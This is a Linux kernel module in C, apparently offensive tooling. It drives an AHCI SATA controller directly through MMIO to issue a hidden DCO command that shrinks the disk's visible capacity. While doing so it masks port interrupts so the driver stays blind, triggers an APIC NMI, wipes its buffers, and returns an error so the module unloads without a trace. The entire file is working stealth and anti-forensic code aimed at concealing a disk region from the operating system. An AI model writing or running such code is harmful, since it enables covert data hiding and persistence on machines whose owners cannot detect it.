#include "stealth_dco.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/io.h>
#include <linux/types.h>
#include <linux/bitrev.h>
#include <linux/pci.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System Researcher");
MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module with Dynamic Slot Scanner, NMI-Driven APIC Pipeline, and PxIE Blinding");

/* External declarations from apic_stealth.c */
extern int __init init_apic_stealth_subsystem(void);
extern void cleanup_apic_stealth_subsystem(void);
extern void trigger_nmi_execution(void);
extern void stealth_sanitize_and_flush(void *addr, size_t size);

/**
 * scan_for_available_slot - Dynamically scans PxCI and PxSACT and available slots to find a safe index
 */
static int scan_for_available_slot(void __iomem *port_base)
{
    u32 ci_status, sact_status, combined_mask;
    int i;

    /* Read both tracking registers */
    ci_status   = readl(port_base + 0x38); /* PxCI: Command Issue */
    sact_status = readl(port_base + 0x34); /* PxSACT: SATA Active (NCQ) */
    
    combined_mask = ci_status | sact_status;
    
    pr_info("[STEALTH_DCO] [*] Slot Audit -> PxCI: 0x%08x | PxSACT: 0x%08x | Combined: 0x%08x\n", 
            ci_status, sact_status, combined_mask);

    /* Search for a slot where neither standard nor NCQ commands are running (slots 1 to 30) */
    for (i = 1; i < 31; i++) {
        if (!(combined_mask & (1U << i))) {
            pr_info("[STEALTH_DCO] [+] Selected 100% idle slot index: %d\n", i);
            return i;
        }
    }

    /* Fallback safeguard if all slots are saturated */
    pr_warn("[STEALTH_DCO] [!] Total queue saturation detected; falling back to slot 1\n");
    return 1;
}

static int __init ahci_stealth_dco_init(void)
{
    void __iomem *abar_base = NULL;
    void *port_base = NULL;
    void __iomem *slot0_virt = NULL;
    void __iomem *slot_target_virt = NULL;
    void __iomem *ctba_virt = NULL;
    void __iomem *data_virt = NULL;

    struct sata_fis_h2d    *fis;
    struct ahci_cmd_header *hdr0, *hdr_target;
    struct ahci_prdt_entry *prdt0, *prdt_target;

    u64 lst_phys = 0, slot0_ctba_phys = 0, slot_target_ctba_phys = 0, data_phys = 0;
    u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val, old_pxie;
    int target_slot = 0;
    int ret = 0;
    u8 *sector_buf;

    pr_info("[STEALTH_DCO] ==================================================\n");
    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + NMI APIC STEALTH (PXIE BLINDED) ---\n");
    pr_info("[STEALTH_DCO] ==================================================\n");

    /* 1. Initialize Persistent APIC & LVT Blinding Subsystem */
    if (init_apic_stealth_subsystem() != 0) {
        pr_err("[STEALTH_DCO] FATAL: Failed to initialize APIC stealth subsystem\n");
        return -ENOMEM;
    }

    /* 2. Acquire ABAR Mapping */
    abar_base = get_stealth_abar_mmio();
    if (!abar_base) {
        pr_err("[STEALTH_DCO] FATAL: Failed to acquire ABAR mapping\n");
        ret = -ENODEV;
        goto out_apic;
    }

    pr_info("[STEALTH_DCO] [*] ABAR reference acquired: 0x%lx\n", (unsigned long)abar_base);

    /* 3. Execute Hardware Audits and Asynchronous NMI Trigger */
    execute_method2_onchip_mmio_audit(abar_base);
    {
        u8 target_bus = 0;
        u8 target_dev = 31;
        u8 target_fn  = 0;
        suppress_interrupts_adaptive(target_bus, target_dev, target_fn);
    }
    
    /* Fire out-of-band execution via Local APIC NMI trap */
    trigger_nmi_execution();

    port_base = (void *)((char *)abar_base + AHCI_PORT_BASE);

    ssts_val = readl((char *)port_base + AHCI_PxSSTS);
    pr_info("[STEALTH_DCO] [*] Port SStatus (PxSSTS): 0x%08x\n", ssts_val);

    clb_lo = readl((char *)port_base + AHCI_PxCLB);
    clb_hi = readl((char *)port_base + AHCI_PxCLBU);
    lst_phys = ((u64)clb_hi << 32) | clb_lo;
    if (!lst_phys) {
        pr_err("[STEALTH_DCO] FATAL: PxCLB is 0, port uninitialized\n");
        ret = -ENODEV;
        goto out_abar;
    }

    cmd_val = readl((char *)port_base + AHCI_PxCMD);
    cmd_val |= (1U << 0) | (1U << 4);
    writel(cmd_val, (char *)port_base + AHCI_PxCMD);
    wmb();

    /* 4. Dynamically Choose an Available Slot */
    target_slot = scan_for_available_slot(port_base);

    /* Map Slot 0 and the dynamically chosen target slot */
    slot0_virt = manual_direct_map(lst_phys + (0 * 32));
    slot_target_virt = manual_direct_map(lst_phys + (target_slot * 32));
    if (!slot0_virt || !slot_target_virt) {
        pr_err("[STEALTH_DCO] FATAL: manual_direct_map failed for command slots\n");
        ret = -EFAULT;
        goto out_abar;
    }

    hdr0 = (struct ahci_cmd_header *)slot0_virt;
    slot0_ctba_phys = ((u64)hdr0->ctbau << 32) | hdr0->ctba;

    hdr_target = (struct ahci_cmd_header *)slot_target_virt;
    slot_target_ctba_phys = ((u64)hdr_target->ctbau << 32) | hdr_target->ctba;

    if (!slot0_ctba_phys || !slot_target_ctba_phys) {
        pr_err("[STEALTH_DCO] FATAL: Pre-allocated CTBA addresses are invalid\n");
        ret = -EFAULT;
        goto out_abar;
    }

    ctba_virt = manual_direct_map(slot_target_ctba_phys);
    if (!ctba_virt) {
        pr_err("[STEALTH_DCO] FATAL: Failed to map target slot CTBA\n");
        ret = -EFAULT;
        goto out_abar;
    }

    prdt0 = (struct ahci_prdt_entry *)((char *)manual_direct_map(slot0_ctba_phys) + 0x80);
    data_phys = ((u64)prdt0->dbau << 32) | prdt0->dba;
    if (!data_phys) {
        data_phys = slot0_ctba_phys + 0x100;
    }

    data_virt = manual_direct_map(data_phys);
    if (!data_virt) {
        pr_err("[STEALTH_DCO] FATAL: Failed to map pre-allocated data buffer\n");
        ret = -EFAULT;
        goto out_abar;
    }

    memset((void *)ctba_virt, 0, 256);
    memset((void *)data_virt, 0, 512);

    /* ------------------------------------------------------------------------
     * BLINDING SETUP: Temporarily mask port interrupts (PxIE @ offset 0x14)
     * to prevent libata from processing asynchronous state changes.
     * ------------------------------------------------------------------------ */
    old_pxie = readl((char *)port_base + 0x14);
    writel(0, (char *)port_base + 0x14);
    wmb();

    /* ------------------------------------------------------------------------
     * PHASE 1: Inspect Tail Sector (Targeting Dynamic Slot)
     * ------------------------------------------------------------------------ */
    pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) via Slot %d ---\n", 
            (unsigned long long)TARGET_INSPECT_LBA, target_slot);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0x25; /* READ DMA EXT */
    fis->lba0        = (u8)(TARGET_INSPECT_LBA & 0xFF);
    fis->lba1        = (u8)((TARGET_INSPECT_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((TARGET_INSPECT_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((TARGET_INSPECT_LBA >> 24) & 0xFF);
    fis->lba4        = (u8)((TARGET_INSPECT_LBA >> 32) & 0xFF);
    fis->lba5        = (u8)((TARGET_INSPECT_LBA >> 40) & 0xFF);
    fis->count_low   = 0x01;

    prdt_target = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
    prdt_target->dba  = (u32)(data_phys & 0xFFFFFFFF);
    prdt_target->dbau = (u32)(data_phys >> 32);
    prdt_target->dbc  = (511 & 0x3FFFFF);

    hdr_target->dw0   = (5 & 0x1F) | (1 << 16); 
    hdr_target->dw1   = 0;
    hdr_target->ctba  = (u32)(slot_target_ctba_phys & 0xFFFFFFFF);
    hdr_target->ctbau = (u32)(slot_target_ctba_phys >> 32);
    wmb();

    ret = execute_ahci_slot_stealth(port_base, target_slot, false);
    if (ret == 0) {
        sector_buf = (u8 *)data_virt;
        if (*(u64 *)sector_buf == 0x5452415020494645ULL) {
            pr_warn("[STEALTH_DCO] [+] GPT Backup Header detected at tail boundary.\n");
        } else {
            pr_info("[STEALTH_DCO] [+] Tail sector verified successfully.\n");
        }
    } else {
        ret = -EIO;
        goto restore_pxie;
    }

    /* ------------------------------------------------------------------------
     * PHASE 2: DCO Micro-Trim (Targeting Dynamic Slot)
     * ------------------------------------------------------------------------ */
    pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) via Slot %d ---\n", 
            (unsigned long long)STEALTH_MAX_LBA, target_slot);
    memset((void *)ctba_virt, 0, 256);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0xB1; /* DEVICE CONFIGURATION */
    fis->feature_low = 0xC2; /* SET */
    fis->lba0        = (u8)(STEALTH_MAX_LBA & 0xFF);
    fis->lba1        = (u8)((STEALTH_MAX_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((STEALTH_MAX_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
    fis->count_low   = 0x01;

    hdr_target->dw0   = (5 & 0x1F) | (0 << 16); 
    hdr_target->dw1   = 0;
    hdr_target->ctba  = (u32)(slot_target_ctba_phys & 0xFFFFFFFF);
    hdr_target->ctbau = (u32)(slot_target_ctba_phys >> 32);
    wmb();

    ret = execute_ahci_slot_stealth(port_base, target_slot, true);
    if (ret == 0) {
        pxis_after = readl((char *)port_base + AHCI_PxIS);
        if (pxis_after & PxIS_TFES) {
            pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
            ret = -EIO;
        } else {
            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via Slot %d and NMI pipeline.\n", target_slot);
            ret = 0;
        }
    } else {
        ret = -EIO;
    }

restore_pxie:
    /* Clear any pending status flags and restore original PxIE mask */
    writel(0xFFFFFFFF, (char *)port_base + 0x10); // Clear PxIS
    writel(old_pxie, (char *)port_base + 0x14);
    wmb();

out_abar:
    if (abar_base)
        iounmap(abar_base);

    /* APIC-serialized stealth sanitization and cache line flushing */
    if (ctba_virt) {
        stealth_sanitize_and_flush((void *)ctba_virt, 256);
    }
    if (data_virt) {
        stealth_sanitize_and_flush((void *)data_virt, 512);
    }

out_apic:
    /* Clean up persistent APIC mapping before exit */
    cleanup_apic_stealth_subsystem();

    pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);
    return (ret == 0) ? -ENODEV : ret;
}

static void __exit ahci_stealth_dco_exit(void) {}

module_init(ahci_stealth_dco_init);
module_exit(ahci_stealth_dco_exit);